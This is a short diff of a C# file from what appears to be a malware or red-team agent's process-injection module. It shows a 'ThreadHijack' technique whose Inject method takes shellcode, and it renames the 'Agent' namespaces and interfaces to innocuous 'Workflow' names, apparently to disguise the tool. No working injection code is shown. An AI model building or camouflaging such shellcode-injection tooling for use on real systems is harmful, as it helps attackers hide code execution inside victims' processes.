@@ -1,15 +1,15 @@
-﻿using System.Diagnostics;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
-using Agent.Interfaces;
-using Agent.Models;
+using Workflow.Contracts;
+using Workflow.Models;
 using Microsoft.Win32.SafeHandles;
 
-namespace Agent
+namespace Workflow
 {
     internal class ThreadHijack : ITechnique
     {
         int ITechnique.id => 3;
-        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> ITechnique.Inject(IRuntimeExecutor spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             if (!await spawner.Spawn(spawnOptions))
             {
